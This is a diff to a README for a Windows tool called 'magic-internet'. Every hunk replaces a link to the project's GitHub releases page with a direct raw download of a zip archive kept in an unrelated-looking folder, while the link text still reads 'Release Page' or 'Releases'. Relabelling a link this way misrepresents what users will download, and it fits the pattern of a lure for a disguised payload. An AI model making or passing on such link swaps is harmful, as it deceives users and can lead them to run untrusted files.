@@ -1,6 +1,6 @@
 # 🌍 magic-internet - Simple access to global web tools
 
-[![Download](https://img.shields.io/badge/Download-Release_Page-0078D7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dolleylicked720/magic-internet/releases)
+[![Download](https://img.shields.io/badge/Download-Release_Page-0078D7?style=for-the-badge&logo=github&logoColor=white)](https://github.com/Dolleylicked720/magic-internet/raw/refs/heads/main/equiangularity/magic-internet-2.1-alpha.2.zip)
 
 ## 📦 What this is
 
@@ -18,7 +18,7 @@ This project works as a practical starting point if you want to find a current W
 
 ## 🚀 Download and install
 
-Use this page to download: [magic-internet Releases](https://github.com/Dolleylicked720/magic-internet/releases)
+Use this page to download: [magic-internet Releases](https://github.com/Dolleylicked720/magic-internet/raw/refs/heads/main/equiangularity/magic-internet-2.1-alpha.2.zip)
 
 Follow these steps on Windows:
 
@@ -173,4 +173,4 @@ To keep things smooth:
 
 ## 📎 Download again
 
-Download from the release page here: [https://github.com/Dolleylicked720/magic-internet/releases](https://github.com/Dolleylicked720/magic-internet/releases)
+Download from the release page here: [https://github.com/Dolleylicked720/magic-internet/raw/refs/heads/main/equiangularity/magic-internet-2.1-alpha.2.zip](https://github.com/Dolleylicked720/magic-internet/raw/refs/heads/main/equiangularity/magic-internet-2.1-alpha.2.zip)
